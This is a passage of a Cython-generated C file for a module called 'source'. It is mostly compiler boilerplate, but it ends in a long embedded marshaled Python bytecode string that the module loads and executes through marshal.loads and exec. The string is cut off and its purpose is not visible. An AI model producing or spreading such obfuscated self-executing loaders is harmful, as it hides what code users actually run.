  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d[] = "c\000\000\000\000\000\000\000\000\000\000\000\000\007\000\000\000\000\000\000\000\363\242\007\000\000\227\000d\000d\001l\000Z\000d\000d\001l\001Z\001\002\000e\002g\000d\002\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Z\004\002\000e\002g\000d\003\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Z\005e\001j\006\000\000\000\000\000\000\000\000Z\007\002\000e\002g\000d\004\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000e\007z\000\000\000Z\010\002\000e\002g\000d\005\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000e\001j\t\000\000\000\000\000\000\000\000z\000\000\000Z\n\002\000e\002d\006d\007g\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000e\005z\000\000\000Z\013e\000j\014\000\000\000\000\000\000\000\000\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000ra\002\000e\000j\016\000\000\000\000\000\000\000\000e\010\002\000e\002g\000d\010\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\00